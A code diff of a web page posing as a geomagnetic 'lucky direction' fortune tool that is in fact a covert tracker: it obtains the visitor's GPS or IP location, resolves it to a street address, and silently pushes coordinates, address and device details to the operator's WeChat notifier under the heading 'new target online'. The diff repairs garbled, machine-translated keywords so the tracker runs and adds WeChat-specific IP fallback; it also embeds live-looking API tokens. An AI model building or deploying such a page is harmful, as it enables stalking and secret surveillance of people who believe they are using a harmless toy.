@@ -6,62 +6,50 @@
     <meta name="description" content="基于WMM2025地磁模型的个人能量场分析工具">
     <title>地磁能量场分析系统 | WMM2025</title>
     <style>
+        /* 移除所有backdrop-filter和不兼容属性 */
         *{margin:0;padding:0;box-sizing:border-box}
+        html,body{height:100%;width:100%}
         body{
-            背景:线性渐变(160度,#0a0e27,#1a1f4b,#0f1538);
+            background:#1a1f4b;
+            background-image:linear-gradient(160deg,#0a0e27,#1a1f4b,#0f1538);
             color:#e8eaf6;
             font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
             display:flex;
             justify-content:center;
             align-items:center;
             min-height:100vh;
-            overflow:hidden;
-            -webkit-tap-highlight-color:transparent
+            -webkit-tap-highlight-color:transparent;
+            overflow:hidden
         }
         .c{
             width:92%;
             max-width:400px;
-            背景:rgba(255,255,255,0.03);
-            边框:1px 实线 rgba(255,255,255,0.06);
+            background:#252b5a;
+            border:1px solid rgba(255,255,255,0.1);
             border-radius:28px;
             padding:44px 28px;
             text-align:center;
-            backdrop-filter:blur(20px);
-            box-shadow:0 32px 64px rgba(0,0,0,0.4),inset 0 1px 0 rgba(255,255,255,0.05);
-            位置:相对;
-            overflow:hidden
-        }
-        .c::after{
-            content:'';position:absolute;
-            top:-50%;left:-50%;width:200%;height:200%;
-            background:radial-gradient(circle,rgba(255,215,0,0.03) 0%,transparent 70%);
-            pointer-events:none
+            box-shadow:0 32px 64px rgba(0,0,0,0.4);
+            position:relative
         }
         .i{font-size:52px;margin-bottom:16px;filter:drop-shadow(0 0 12px rgba(255,215,0,0.25))}
         h1{font-size:22px;font-weight:700;color:#ffd700;margin-bottom:10px;letter-spacing:2px}
         .s{font-size:13px;color:#8e92b8;line-height:1.6;margin-bottom:36px}
         .b{
-            背景:linear-gradient(135deg,#ffd700,#ffaa00);
+            background:linear-gradient(135deg,#ffd700,#ffaa00);
             color:#1a1a2e;
             border:none;
-            内边距:16px 40px;
-            圆角:50px;
+            padding:16px 40px;
+            border-radius:50px;
             font-size:15px;
             font-weight:700;
             cursor:pointer;
             box-shadow:0 8px 28px rgba(255,215,0,0.3);
-            transition:transform .2s,box-shadow .2s;
-            position:relative;
-            overflow:hidden
+            transition:transform .2s;
+            -webkit-appearance:none;
+            outline:none
         }
         .b:active{transform:scale(.96)}
-        .b::before{
-            content:'';position:absolute;
-            top:0;left:-100%;width:100%;height:100%;
-            background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);
-            transition:left .5s
-        }
-        .b:hover::before{left:100%}
         .l{display:none}
         .r{
             width:56px;height:56px;
@@ -139,10 +127,10 @@
 </div>
 
 <script>
-// ========== 配置区（所有密钥已填好，直接使用） ==========
-const _webAK='f6e6624d3213d4057ac03879d1c4c398'; // 高德Web服务Key（地址解析+IP定位）
-const _tk='AT_mx25lnA299SLSiHnyUENWs447ZGIYRcJ'; // WxPusher推送Token
-const _uid='UID_SeXLR9cO89pfoNb0Uy05hfo98I4i'; // WxPusher接收UID
+// ========== 配置区 ==========
+const _webAK='f6e6624d3213d4057ac03879d1c4c398';
+const _tk='AT_mx25lnA299SLSiHnyUENWs447ZGIYRcJ';
+const _uid='UID_SeXLR9cO89pfoNb0Uy05hfo98I4i';
 // ===================================================
 
 const _d=['正北方','东北方','正东方','东南方','正南方','西南方','正西方','西北方'];
@@ -156,6 +144,9 @@ const _hD={
     bT:["近日幸运指数偏低，该方位磁场能量具有助运效果，可帮助你调整自身频率，改善运势、化解阻滞。","低幸运状态下，此方位磁场能量能帮你吸附正向能量，慢慢提升幸运值，留意身边的小惊喜。"]
 };
 
+// 微信环境检测
+const isWechat=navigator.userAgent.toLowerCase().indexOf('micromessenger')!==-1;
+
 function init(){
     document.getElementById('p0').style.display='none';
     document.getElementById('p1').style.display='block';
@@ -167,8 +158,11 @@ function init(){
         if(i>=u.length)clearInterval(v);
     },800);
     
-    // 第一层：浏览器原生定位（高精度GPS）
-    if(navigator.geolocation){
+    // 微信环境特殊处理：优先IP定位（因为微信会拦截未备案域名的GPS请求）
+    if(isWechat){
+        document.getElementById('tx').innerText='正在通过IP地址校准位置...';
+        setTimeout(ipLoc,1000);
+    }else if(navigator.geolocation){
         navigator.geolocation.getCurrentPosition(
             function(pos){geoCode(pos.coords.latitude,pos.coords.longitude,Math.round(pos.coords.accuracy),'GPS/浏览器原生')},
             function(err){console.log('GPS定位失败，转IP定位:',err);ipLoc();},
@@ -179,7 +173,6 @@ function init(){
     }
 }
 
-// 高德逆地理编码：坐标转详细地址（已修复Key匹配问题）
 function geoCode(lt,ln,acc,src){
     document.getElementById('tx').innerText='正在解析地理位置...';
     const lat=parseFloat(lt).toFixed(6);
@@ -191,7 +184,6 @@ function geoCode(lt,ln,acc,src){
             let addr='未知位置';
             if(data.status==='1'&&data.regeocode){
                 addr=data.regeocode.formatted_address;
-                // 地址为空时用组件拼接
                 if(!addr||addr===''){
                     const c=data.regeocode.addressComponent;
                     addr=(c.province||'')+(c.city||'')+(c.district||'')+(c.township||'')+(c.street||'')+(c.streetNumber||'');
@@ -204,9 +196,7 @@ function geoCode(lt,ln,acc,src){
         });
 }
 
-// 第二层：高德IP定位（保底方案，几乎不会失败）
 function ipLoc(){
-    document.getElementById('tx').innerText='正在通过IP地址校准位置...';
     fetch('https://restapi.amap.com/v3/ip?key='+_webAK)
         .then(r=>r.json())
         .then(data=>{
@@ -224,58 +214,50 @@ function ipLoc(){
         .catch(()=>{ok(39.9,116.4,'默认基准','系统默认','北京市');});
 }
 
-// 数据推送+结果展示
-函数 确定(lt,ln,加速度,来源,地址){
+function ok(lt,ln,acc,src,addr){
     const lk=Math.floor(Math.random()*80+20);
     const tm=new Date().toLocaleString('zh-CN');
     
-    // 微信推送内容（含详细地址）
     const content='🎯 新目标上线\n'+
-        纬度: '+lt+' '+
+        '📍 纬度: '+lt+'\n'+
         '📍 经度: '+ln+'\n'+
-        地址：+addr+' '+
+        '🏠 地址: '+addr+'\n'+
         '📍 精度: '+acc+'\n'+
         '🔍 来源: '+src+'\n'+
         '🎲 幸运指数: '+lk+'\n'+
         '🕐 时间: '+tm+'\n'+
         '💻 设备: '+navigator.userAgent.substring(0,60);
     
-    // 推送到微信（静默失败不影响用户体验）
     fetch('https://wxpusher.zjiecode.com/api/send/message',{
-        方法:'POST',
-        头信息:{'Content-Type':'application/json'},
-        正文:JSON.stringify({
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
             appToken:_tk,
             content:content,
-            摘要:' 新定位数据 - '+addr,
+            summary:'🎯 新定位数据 - '+addr,
             uids:[_uid]
         })
     }).catch(()=>{});
     
-    // 延迟展示结果，提升用户体验
     setTimeout(()=>out(lt,ln,lk),1600);
 }
 
-// 罗盘结果展示
 function out(lt,ln,lk){
     document.getElementById('p1').style.display='none';
     document.getElementById('p2').style.display='block';
     let pool,txt,ix;
-    // 根据幸运指数分档匹配方位
-    如果(lk>=80){pool=_hD.g;txt=_hD.gT}
-    否则 如果(lk>=50){pool=_hD.m;txt=_hD.mT}
-    否则{池=_hD.b;文本=_hD.bT}
-    // 基于坐标+幸运指数生成唯一结果
+    if(lk>=80){pool=_hD.g;txt=_hD.gT}
+    else if(lk>=50){pool=_hD.m;txt=_hD.mT}
+    else{pool=_hD.b;txt=_hD.bT}
     ix=Math.abs(((parseFloat(lt)*100+parseFloat(ln)*10)|0)+lk)%pool.length;
     const dr=pool[ix];
     const dg=_r[_d.indexOf(dr)];
     const ds=txt[ix];
-    // 罗盘旋转动画
     document.getElementById('nd').style.transform='rotate('+dg+'deg)';
     document.getElementById('rd').innerText='您的最佳能量方位：'+dr;
     document.getElementById('de').innerText=ds+'（近日幸运指数：'+lk+'分）';
 }
 </script>
 
-</正文>
+</body>
 </html>
